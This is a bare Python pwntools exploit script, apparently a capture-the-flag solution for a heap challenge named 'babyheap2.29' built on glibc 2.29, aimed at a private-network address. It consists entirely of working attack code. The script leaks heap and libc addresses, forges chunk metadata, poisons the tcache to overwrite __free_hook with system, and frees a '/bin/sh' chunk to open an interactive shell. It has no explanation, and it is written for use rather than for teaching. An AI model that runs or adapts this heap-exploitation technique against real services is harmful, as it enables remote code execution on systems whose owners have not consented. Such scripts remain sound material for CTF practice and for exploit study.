from pwn import *
def cmd(c):
	p.sendlineafter(": ",str(c))
def add(size):
	cmd(1)
	cmd(size)
def edit(idx,c):
	cmd(2)
	cmd(idx)
	cmd(len(c))
	p.sendafter(": ",c)
def show(idx):
	cmd(4)
	cmd(idx)
def free(idx):
	cmd(3)
	cmd(idx)
#context.log_level='debug'
libc=ELF("./libc-2.29.so")
#p=process('./babyheap2.29',env={"LD_PRELOAD":"../libc-2.29.so"})
p=remote("192.168.22.203",1025)
add(0x100)
add(0x100)
free(1)
free(0)
add(0x100)
add(0x100)
show(0)
p.readuntil(": ")
heap=u64(p.readline()[:-1].ljust(8,'\x00'))+(0x5601a38ee000-0x5601a38ee370)
log.warning(hex(heap))
add(0x98)#2
add(0x4f8)#3
add(0x18)#4
edit(2,p64(heap+0x480)+p64(heap+0x480)+p64(heap+0x470)+p64(heap+0x470)+'\x00'*0x70+p64(0xa0))
free(3)
show(2)
p.readuntil("2]: ")
base=u64(p.readline()[:-1].ljust(8,'\x00'))-(0x7ffff7fc4ca0-0x7ffff7de0000)
log.warning(hex(base))

add(0x98)#3
add(0x18)#5
free(2)
libc.address=base

edit(3,p64(libc.sym['__free_hook']))

add(0x98)#2
#gdb.attach(p,"b free")
add(0x98)#6
edit(6,p64(libc.sym['system']))
edit(2,"/bin/sh\x00")
free(2)
p.interactive()
